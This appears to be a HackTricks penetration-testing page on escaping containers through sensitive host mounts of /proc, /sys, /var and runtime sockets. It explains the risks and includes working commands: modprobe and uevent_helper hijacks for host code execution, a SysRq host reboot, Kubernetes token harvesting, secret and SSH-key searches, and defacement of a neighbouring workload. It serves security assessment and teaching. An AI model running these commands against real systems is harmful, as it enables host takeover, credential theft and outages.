# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts are one of the most important practical container-escape surfaces because they often collapse a carefully isolated process view back into direct visibility of host resources. The dangerous cases are not limited to `/`. Bind mounts of `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, or device-related paths can expose kernel controls, credentials, neighboring container filesystems, and runtime management interfaces.

This page exists separately from the individual protection pages because the abuse model is cross-cutting. A writable host mount is dangerous partly because of mount namespaces, partly because of user namespaces, partly because of AppArmor or SELinux coverage, and partly because of what exact host path was exposed. Treating it as its own topic makes the attack surface much easier to reason about.

## `/proc` Exposure

procfs contains both ordinary process information and high-impact kernel control interfaces. A bind mount such as `-v /proc:/host/proc` or a container view that exposes unexpected writable proc entries can therefore lead to information disclosure, denial of service, or direct host code execution.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Start by checking which high-value procfs entries are visible or writable:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

The practical value of each path is different, and treating them all as if they had the same impact makes triage harder:

- `/proc/sys/kernel/core_pattern`
  If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
  This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially interesting when combined with a way to trigger the helper path.
- `/proc/sys/vm/panic_on_oom`
  This is not usually a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions into kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
  If the registration interface is writable, the attacker may register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.
- `/proc/config.gz`
  Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata.
- `/proc/sysrq-trigger`
  Mostly a denial-of-service path, but a very serious one. It can reboot, panic, or otherwise disrupt the host immediately.
- `/proc/kmsg`
  Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel exploitation.
- `/proc/kallsyms`
  Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
- `/proc/[pid]/mem`
  This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
- `/proc/kcore`
  Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
- `/proc/kmem` and `/proc/mem`
  Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
- `/proc/sched_debug`
  Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
- `/proc/[pid]/mountinfo`
  Extremely useful for reconstructing where the container really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the container layer.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

These commands are useful because a number of host-execution tricks require turning a path inside the container into the corresponding path from the host's point of view.

### Full Example: `modprobe` Helper Path Abuse

If `/proc/sys/kernel/modprobe` is writable from the container and the helper path is interpreted in the host context, it can be redirected to an attacker-controlled payload:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```

The exact trigger depends on the target and kernel behavior, but the important point is that a writable helper path can redirect a future kernel helper invocation into attacker-controlled host-path content.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

If the goal is exploitability assessment rather than immediate escape:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

These commands help answer whether useful symbol information is visible, whether recent kernel messages reveal interesting state, and which kernel features or mitigations are compiled in. The impact is usually not direct escape, but it can sharply shorten kernel-vulnerability triage.

### Full Example: SysRq Host Reboot

If `/proc/sysrq-trigger` is writable and reaches the host view:

```bash
echo b > /proc/sysrq-trigger
```

The effect is immediate host reboot. This is not a subtle example, but it clearly demonstrates that procfs exposure can be far more serious than information disclosure.

## `/sys` Exposure

sysfs exposes large amounts of kernel and device state. Some sysfs paths are mainly useful for fingerprinting, while others can affect helper execution, device behavior, security-module configuration, or firmware state.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

These paths matter for different reasons. `/sys/class/thermal` can influence thermal-management behavior and therefore host stability in badly exposed environments. `/sys/kernel/vmcoreinfo` can leak crash-dump and kernel-layout information that helps with low-level host fingerprinting. `/sys/kernel/security` is the `securityfs` interface used by Linux Security Modules, so unexpected access there may expose or alter MAC-related state. EFI variable paths can affect firmware-backed boot settings, making them much more serious than ordinary configuration files. `debugfs` under `/sys/kernel/debug` is especially dangerous because it is intentionally a developer-oriented interface with far fewer safety expectations than hardened production-facing kernel APIs.

Useful review commands for these paths are:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

What makes those commands interesting:

- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
- `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
- `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
- `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.

### Full Example: `uevent_helper`

If `/sys/kernel/uevent_helper` is writable, the kernel may execute an attacker-controlled helper when a `uevent` is triggered:

```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```

The reason this works is that the helper path is interpreted from the host's point of view. Once triggered, the helper runs in the host context rather than inside the current container.

## `/var` Exposure

Mounting the host's `/var` into a container is often underestimated because it does not look as dramatic as mounting `/`. In practice it can be enough to reach runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, and neighboring application filesystems. On modern nodes, `/var` is often where the most operationally interesting container state actually lives.

### Kubernetes Example

A pod with `hostPath: /var` can often read other pods' projected tokens and overlay snapshot content:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

These commands are useful because they answer whether the mount exposes only dull application data or high-impact cluster credentials. A readable service-account token may immediately turn local code execution into Kubernetes API access.

If the token is present, validate what it can reach instead of stopping at token discovery:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

The impact here may be much larger than local node access. A token with broad RBAC can turn a mounted `/var` into cluster-wide compromise.

### Docker And containerd Example

On Docker hosts the relevant data is often under `/var/lib/docker`, while on containerd-backed Kubernetes nodes it may be under `/var/lib/containerd` or snapshotter-specific paths:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

If the mounted `/var` exposes writable snapshot contents of another workload, the attacker may be able to alter application files, plant web content, or change startup scripts without touching the current container configuration.

Concrete abuse ideas once writable snapshot content is found:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```

These commands are useful because they show the three main impact families of mounted `/var`: application tampering, secret recovery, and lateral movement into neighboring workloads.

## Runtime Sockets

Sensitive host mounts often include runtime sockets rather than full directories. These are so important that they deserve explicit repetition here:

```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

See [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) for full exploitation flows once one of these sockets is mounted.

As a quick first interaction pattern:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

If one of these succeeds, the path from "mounted socket" to "start a more privileged sibling container" is usually much shorter than any kernel breakout path.

## Mount-Related CVEs

Host mounts also intersect with runtime vulnerabilities. Important recent examples include:

- `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, where OverlayFS copy-up races could produce host-path writes during builds.
- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
- `CVE-2024-40635` in containerd, where a large `User` value could overflow into UID 0 behavior.

These CVEs matter here because they show that mount handling is not only about operator configuration. The runtime itself may also introduce mount-driven escape conditions.

## Checks

Use these commands to locate the highest-value mount exposures quickly:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

What is interesting here:

- Host root, `/proc`, `/sys`, `/var`, and runtime sockets are all high-priority findings.
- Writable proc/sys entries often mean the mount is exposing host-global kernel controls rather than a safe container view.
- Mounted `/var` paths deserve credential and neighboring-workload review, not just filesystem review.
